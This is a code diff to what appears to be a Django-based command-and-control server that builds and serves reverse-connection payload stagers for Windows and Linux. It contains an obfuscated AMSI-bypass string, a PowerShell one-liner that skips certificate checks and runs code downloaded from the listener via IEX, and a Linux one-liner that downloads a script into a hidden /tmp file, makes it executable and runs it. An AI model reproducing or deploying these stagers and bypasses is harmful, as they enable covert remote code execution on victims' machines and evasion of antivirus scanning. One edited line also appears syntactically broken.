@@ -102,16 +102,16 @@ class Listener():
             eth = request.POST['listener']      
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
-            output_path= "/tmp/{}".format(eth)
+            #output_path= "/tmp/Win-{}".format(eth)
             with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
                 payload = p.read()
             payload = payload.replace('REPLACE_IP',ip)
             payload = payload.replace('REPLACE_PORT',str(port))
             payload = payload.replace('REPLACE_INTERFACE',eth)
-            with open(output_path,"wt") as R:
-                R.write(payload)
+            # with open(output_path,"wt") as R:
+            #     R.write(payload)
 
-            with open(listen_path+"/{}".format(eth),"wt") as R:
+            with open(listen_path+"/Win-{}".format(eth),"wt") as R:
                 R.write(payload)
 
             listener = ListenerForm.objects.get(interface= eth)
@@ -119,8 +119,8 @@ class Listener():
                 listener.ip = ip
                 listener.save()
             amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
-            # -ExecutionPolicy unrestricted -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object Net.WebClient).DownloadString(\"127.0.0.1/xxx\")" 
-            oneliner = "{} [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/sc/{}\')".format(amsi,ip, str(port), eth)
+            noCheckCert= '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = ;'
+            oneliner = "{} {} IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/sc/{}\')".format(amsi,noCheckCert,ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
 
 #powershell.exe -nop -w hidden -c 
@@ -135,16 +135,16 @@ class Listener():
             eth = request.POST['listener']
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
-            output_path= "/tmp/{}".format(eth)
+            #output_path= "/tmp/Lin-{}".format(eth)
             with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
                 payload = p.read()
             payload = payload.replace('REPLACE_IP',ip)
             payload = payload.replace('REPLACE_PORT',str(port))
             payload = payload.replace('REPLACE_INTERFACE',eth)
-            with open(output_path,"wt") as R:
-                R.write(payload)
+            # with open(output_path,"wt") as R:
+            #     R.write(payload)
 
-            with open(listen_path+"/{}".format(eth),"wt") as R:
+            with open(listen_path+"/Lin-{}".format(eth),"wt") as R:
                 R.write(payload)
                 
             listener = ListenerForm.objects.get(interface= eth)
@@ -152,7 +152,7 @@ class Listener():
                 listener.ip = ip
                 listener.save()    
                 
-            oneliner = "wget --no-check-certificate https://{}:{}/download/{} -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile".format(ip, str(port), eth)
+            oneliner = "wget --no-check-certificate https://{}:{}/lin_download/{} -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile".format(ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
             #return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})
 
@@ -175,37 +175,25 @@ class Listener():
             if os.path.exists(self.Path) == False:
                 os.mkdir(self.Path)
                 
-        # def run(eth_ip,port):      ######multi threading with django or flask
-        #     app.logger.disabled = True
-        #     app.run(port=port, host=eth_ip)
-            
-        # def start(self):
-        #     server = Process(target=Listener.agent.run(self.eth_ip,port))  
-        #     cli = sys.modules['flask.cli']
-        #     cli.show_server_banner = lambda *x: None
-        #     daemon = threading.Thread(name = self.name,
-        #                                     target = server.start,
-        #                                     args= ())
-        #     daemon.daemon = True
-        #     daemon.start()
-        #     try:
-        #         Listener.agent.start(self)
-        #         print("Listener started.")
-        #     except:
-        #         print("Failed. Check your options.")
-                
 # Create Download link to redirect to sendFile funtion
         def sendScript(request , eth=''):
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
-            # amsi     = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
-            oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/download/{}\')".format(ip,str(port),eth)
+            oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/win_download/{}\')".format(ip,str(port),eth)
             return HttpResponse(oneliner)
 
-# execute payload content to get the connection to our server
-        def sendFile(request, eth=''):
-            output_path= "/tmp/{}".format(eth)
-            f    = open("{}".format(output_path), "rt")
+# execute payload windows content to get the connection to our server
+        def win_sendFile(request, eth=''):
+            # output_path= "Win-{}".format(eth)
+            f    = open(listen_path+"/Win-{}".format(eth), "rt")
+            data = f.read()
+            f.close()
+            return HttpResponse(data)
+        
+# execute payload linux content to get the connection to our server
+        def lin_sendFile(request, eth=''):
+            # output_path= "/tmp/Lin-{}".format(eth)
+            f    = open(listen_path+"/Lin-{}".format(eth), "rt")
             data = f.read()
             f.close()
             return HttpResponse(data)
